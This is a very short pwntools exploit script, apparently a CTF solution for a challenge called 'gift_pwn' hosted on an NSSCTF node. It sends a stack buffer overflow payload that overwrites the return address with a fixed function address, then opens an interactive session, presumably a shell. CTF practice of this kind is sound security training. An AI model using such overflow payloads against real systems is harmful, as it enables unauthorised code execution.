from pwn import*
#p=process('./gift_pwn')
p=remote('node4.anna.nssctf.cn',28137)
payload=b'A'*0x10+b'b'*8+p64(0x4005b6+1)
p.sendline(payload)
p.interactive()
